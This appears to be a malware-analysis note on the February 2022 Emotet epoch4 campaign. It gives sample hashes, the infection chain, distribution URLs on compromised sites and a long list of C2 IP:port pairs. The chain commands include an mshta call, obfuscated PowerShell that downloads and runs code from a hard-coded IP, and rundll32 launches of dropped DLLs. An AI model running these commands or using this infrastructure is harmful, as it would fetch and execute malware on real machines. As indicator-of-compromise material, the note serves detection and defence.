@@ -1,0 +1,95 @@
+Emotet 2022 - 11.02.2022 - epoch4
+
+************************************************************************************************************
+
+.xls f6e3b22ee57db2aca11e52a5b5f9a4ad89631e274e692fe59b6e7f0f6967a222
+
+.dll 18e3b0d902f95fb74affd0f0e203b5a7d6d8a9aa17967611b17377008b5f0c52
+
+mshta http://91.240.118.172/hh/hh.html
+
+$c1 = " (New-Object Net.We"
+$c4 = "bClient).Downlo"
+$c3 = "adString('http://91.240.118.172/hh/hello.png')"
+$ji = " (New-Object Net.WebClient).DownloadString('http://91.240.118.172/hh/hello.png')"
+invoke-expression " (New-Object Net.WebClient).DownloadString('http://91.240.118.172/hh/hello.png')"|invoke-expression
+
+cmd.exe /c C:\Windows\SysWow64\rundll32.exe C:\ProgramData\JooSee.dll Mimic
+
+rundll32.exe C:\ProgramData\JooSee.dll Mimic
+
+rundll32.exe C:\ProgramData\JooSee.dll",DllRegisterServer
+
+rundll32.exe C:\Windows\SysWOW64\Wmstlgnz\rkxihv.nhw,CQhUECct
+
+rundll32.exe C:\Windows\SysWOW64\Wmstlgnz\rkxihv.nhw,DllRegisterServer
+
+
+.dll distro
+
+$path = "C{MMM}:\Pr{MMM}ogramD{MMM}ata\{MMM}JooSee.dll".replace('{MMM}','');
+http://ttisecurity.com/cgi/7RFeiqkgymCs/
+http://tonysommers.net/eln-images/BowlvMV7raSyx8l/
+http://internationalstrategy.org/cgi/VT7we3QHAboswHu2ff/
+http://triangle-associates.com/ESW/Styles/yEHM2ir/
+http://hillyerassociates.com/cgi/qQV/
+http://robevansphotography.com/cgi/vNM8Ufvon3js/
+http://piedpiperdesigns.com/OLDSITE-DEC-2006/0OxPcj5Sjk/
+http://oakcourtpress.com/Guest/M/
+http://idesign-bruceberman.com/cgi/m7CP7jP7DPkcy/
+http://clairemauer.com/wp-admin/vXjSf8tAAMLwwWh3/
+http://joncicchettilandscapearchitect.com/eln-images/welcome/Pkoh97H/
+http://roketscience.com/cgi/qpTxCZiW0HqynNH/
+
+c2's
+
+185.248.140.40:443
+8.9.11.48:443
+200.17.134.35:7080
+207.38.84.195:8080
+79.172.212.216:8080
+45.176.232.124:443
+45.118.135.203:7080
+162.243.175.63:443
+110.232.117.186:8080
+103.75.201.4:443
+195.154.133.20:443
+160.16.102.168:80
+164.68.99.3:8080
+131.100.24.231:80
+216.158.226.206:443
+159.89.230.105:443
+178.79.147.66:8080
+178.128.83.165:80
+212.237.5.209:443
+82.165.152.127:8080
+50.116.54.215:443
+58.227.42.236:80
+119.235.255.201:8080
+144.76.186.49:8080
+138.185.72.26:8080
+162.214.50.39:7080
+81.0.236.90:443
+176.104.106.96:8080
+144.76.186.55:7080
+129.232.188.93:443
+212.24.98.99:8080
+203.114.109.124:443
+103.75.201.2:443
+173.212.193.249:8080
+41.76.108.46:8080
+45.118.115.99:8080
+158.69.222.101:443
+107.182.225.142:8080
+212.237.17.99:8080
+212.237.56.116:7080
+159.8.59.82:8080
+46.55.222.11:443
+104.251.214.46:8080
+31.24.158.56:8080
+153.126.203.229:8080
+51.254.140.238:7080
+185.157.82.211:8080
+217.182.143.207:443
+45.142.114.231:8080
+
